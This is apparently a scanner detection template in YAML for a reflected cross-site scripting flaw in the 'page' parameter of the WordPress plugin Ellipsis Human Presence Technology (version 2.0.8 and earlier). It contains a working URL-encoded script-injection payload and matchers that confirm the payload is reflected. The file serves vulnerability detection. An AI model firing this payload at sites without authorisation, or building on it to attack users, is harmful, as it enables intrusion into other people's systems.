id: wp-ellipsis-xss
brief:
    title: Ellipsis Human Presence Technology <= 2.0.8 - Cross Site Scripting
    by: r3Y3r53
    level: medium
    about: The 'page' GET parameter of the inc/protected-forms-table.php file was affected by a reflected XSS vulnerability.
    label:
        - wpscan
        - packetstorm
        - wordpress
        - wp-plugin
        - ellipsis-human-presence-technology
        - xss
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/wp-content/plugins/ellipsis-human-presence-technology/inc/protected-forms-table.php?&page=%22%20%3E%3Cscript%3Ealert(document.location)%3C/script%3E'
      signs:
        - "on": word
          has:
            - <script>alert(document.location)</script>
            - <form id="protected-forms-table"
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: header
          need: all
